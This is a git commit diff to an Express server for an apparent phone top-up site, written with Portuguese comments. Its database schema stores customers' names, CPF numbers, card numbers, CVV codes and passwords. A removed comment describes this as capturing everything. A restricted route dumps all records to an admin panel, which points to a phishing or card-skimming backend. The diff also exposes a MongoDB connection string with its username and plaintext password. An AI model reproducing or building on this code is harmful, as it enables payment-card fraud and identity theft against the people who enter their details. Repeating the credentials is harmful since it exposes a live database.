be4de3d9a5ce452ae5900d5e7afc21d0bc191949
levi moraes <ingresso944@gmail.com>
2026-03-08 12:10:03 -0300

    ajuste de banco de dados

--- server.js
+++ server.js
@@ -6,12 +6,11 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname)));
 
-// CONEXÃO COM O SEU MONGODB (Senha: Dks10dks@)
-mongoose.connect('mongodb+srv://mateus:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
-  .then(() => console.log('✅ MongoDB Conectado!'))
-  .catch(err => console.error('❌ Erro:', err));
+// CONEXÃO COM O MONGODB (Usuário: ingresso944_db_user | Senha: Dks10dks@)
+mongoose.connect('mongodb+srv://ingresso944_db_user:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
+  .then(() => console.log('✅ Conectado ao MongoDB!'))
+  .catch(err => console.error('❌ Erro de conexão:', err));
 
-// MODELO DE DADOS (Captura tudo: Operadora, CPF, Cartão, CVV, Senha)
 const RecargaSchema = new mongoose.Schema({
     operadora: String, nome: String, cpf: String, telefone: String, 
     valor: String, cartao: String, data: String, cvv: String, senha: String,
@@ -20,7 +19,6 @@ const RecargaSchema = new mongoose.Schema({
 
 const Recarga = mongoose.model('Recarga', RecargaSchema);
 
-// SALVAR DADOS DO CLIENTE
 app.post('/finalizar', async (req, res) => {
     try {
         const nova = new Recarga(req.body);
@@ -29,7 +27,6 @@ app.post('/finalizar', async (req, res) => {
     } catch (err) { res.status(500).send('Erro'); }
 });
 
-// ENVIAR DADOS PARA O SEU PAINEL ADMIN
 app.get('/ver-dados-restritos', async (req, res) => {
     try {
         const dados = await Recarga.find().sort({ dataRegistro: -1 });
